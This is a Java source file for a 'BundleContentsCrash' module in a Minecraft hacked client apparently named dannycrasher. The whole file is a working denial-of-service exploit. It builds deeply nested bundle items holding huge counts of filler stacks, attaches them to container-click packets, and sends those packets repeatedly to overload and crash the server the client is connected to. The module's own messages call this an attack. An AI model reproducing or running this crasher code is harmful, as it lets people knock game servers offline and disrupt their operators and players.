package me.dannycrasher.client.module.impl.crash;

import com.viaversion.viafabricplus.ViaFabricPlus;
import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import me.dannycrasher.client.command.ArgumentType;
import me.dannycrasher.client.module.Module;
import me.dannycrasher.client.module.ModuleContext;
import me.dannycrasher.client.module.ModuleType;
import me.dannycrasher.client.protocol.Protocol;
import me.dannycrasher.client.protocol.components.data.DataComponents;
import me.dannycrasher.client.protocol.components.data.impl.DataBundleContents;
import me.dannycrasher.client.protocol.components.objects.ItemStack;
import me.dannycrasher.client.protocol.components.objects.ItemType;
import me.dannycrasher.client.protocol.packets.PacketCodec;
import me.dannycrasher.client.protocol.packets.play.PacketContainerClick;
import net.minecraft.client.Minecraft;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

public class BundleContentsCrash extends Module {
	public BundleContentsCrash() {
		super("BundleContents", "Nested bundle_contents data-component bomb (1.21+ / ViaBackwards Abuser)", ModuleType.CRASHER);
		addArgument("packets", ArgumentType.INT, 1, 1000, "100");
		addArgument("size 1", ArgumentType.INT, 1, 2096000, "1024");
		addArgument("size 2", ArgumentType.INT, 1, 2096000, "64");
		addArgument("map size", ArgumentType.INT, 1, 46, "16");
		addArgument("threadSleep", ArgumentType.INT, 1, 5000, "1");
		addArgument("loopAmount", ArgumentType.INT, 1, 30, "1");
	}

	private ScheduledExecutorService executorService;

	@Override
	public void executeModule(ModuleContext context) {
		int packets = context.getInt("packets");
		int size1 = context.getInt("size 1");
		int size2 = context.getInt("size 2");
		int mapSize = context.getInt("map size");
		int threadSleep = context.getInt("threadSleep");
		int loopAmount = context.getInt("loopAmount");

		setEnabled(true);

		if (executorService != null && !executorService.isShutdown()) {
			executorService.shutdownNow();
			context.sendMessage("Previous attack <red>stopped<white>!");
		}

		int protocol = ViaFabricPlus.getImpl().getTargetVersion().getVersion();
		if (Protocol.FULL_ITEM_PROTOCOLS.contains(protocol)) {
			int bundleId = ItemType.BUNDLE.getId(protocol);
			int fillerId = ItemType.STONE.getId(protocol);

			ItemStack leaf = new ItemStack(fillerId, 1, null);
			List<ItemStack> inner = new ArrayList<>(size1);
			for (int i = 0; i < size1; i++) {
				inner.add(leaf);
			}

			DataComponents innerComponents = new DataComponents();
			innerComponents.put(new DataBundleContents(inner));
			ItemStack nestedBundle = new ItemStack(bundleId, 1, innerComponents);

			List<ItemStack> outer = new ArrayList<>(size2);
			for (int i = 0; i < size2; i++) {
				outer.add(nestedBundle);
			}

			DataComponents outerComponents = new DataComponents();
			outerComponents.put(new DataBundleContents(outer));
			ItemStack stack = new ItemStack(bundleId, 1, outerComponents);

			Int2ObjectMap<ItemStack> int2objectmap = new Int2ObjectOpenHashMap<>();
			for (int j = 0; j < mapSize; ++j) {
				int2objectmap.put(j, stack);
			}

			context.sendMessage("Start crashing with method: <aqua>" + getName() + "<white>!");

			AtomicInteger check = new AtomicInteger(0);
			executorService = Executors.newSingleThreadScheduledExecutor();
			Runnable clickTask = () -> {
				if (!isEnabled() || !Protocol.isSendingEnabled() || check.get() == loopAmount
						|| (Minecraft.getInstance().getConnection() == null || !Minecraft.getInstance().getConnection().getConnection().isConnected())) {
					executorService.shutdown();
					setEnabled(false);
					if (Minecraft.getInstance().getConnection() != null) {
						context.sendMessage("Attack <green>successful <white>finished!");
					}
				} else {
					PacketCodec.sendPacket(new PacketContainerClick(
									ViaFabricPlus.getImpl().getTargetVersion().getVersion(),
									0,
									1,
									10,
									PacketContainerClick.ContainerActionType.CLICK_ITEM,
									PacketContainerClick.ContainerAction.RIGHT_CLICK,
									stack,
									int2objectmap),
							packets);
				}

				check.getAndIncrement();
			};
			executorService.scheduleAtFixedRate(clickTask, 0, threadSleep, TimeUnit.MILLISECONDS);
		} else {
			context.sendMessage("<red>You cant use this method on the version you are currently on. Change the version in viafabric");
		}
	}

	@Override
	public void onDisconnect() {
		super.onDisconnect();
		if (executorService != null) {
			executorService.shutdownNow();
		}
	}
}
